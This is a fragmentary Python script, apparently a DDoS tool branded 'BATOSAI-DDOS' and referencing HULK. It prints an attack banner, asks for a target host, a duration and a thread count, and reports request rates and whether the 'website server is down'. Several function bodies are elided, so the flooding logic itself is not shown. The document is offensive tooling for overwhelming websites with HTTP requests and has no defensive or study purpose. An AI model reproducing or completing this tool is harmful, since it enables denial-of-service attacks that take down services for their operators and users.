...
def update_title(pps, requests_per_seconds):
    title = f"HTTP-REQUESTS | BATOSAINET Attack Sent | PPS: {pps} | RQS: {requests_per_seconds}"
    if os.name == 'nt':
...
def send_request(url):
    ...
    try:
        ...
        if status == 200:
            print(f"HTTP-REQUESTS | BATOSAI.NET Attack Sent | Status: 200")
        elif status == 500:
            print(f"HTTP-REQUESTS | BOTSAI.NET Attack Sent | Status: 500 ERROR WEBSITE SERVER IS DOWN")
        else:
            print(f"BATOSAINET-ATTACK | HULK Version 4.5 | Status: {status}")
    except requests.RequestException as e:
        print(f"HTTP-REQUESTS | BATOSAI Attack Sent | Status: 500 ERROR WEBSITE SERVER IS DOWN")
...
def main():
    ...
    print("""
   ___  ___  ____  ____    ___ _______________  _______ __
  / _ \/ _ \/ __ \/ __/   / _ /_  __/_  __/ _ |/ ___/ //_/
 / // / // / /_/ /\ \    / __ |/ /   / / / __ / /__/ ,<   
/____/____/\____/___/   /_/ |_/_/   /_/ /_/ |_\___/_/|_|  

WEBSITE ATTACKS CLOGGING BRIDGE
DISTRIBUTED DENIAL OF SERVICE | BY BATOSAI-DDOS

""")
    url = input("Enter Host: ").strip()
    duration = int(input("Enter Time: ").strip())
    threads_count = int(input("Enter Thread: ").strip())
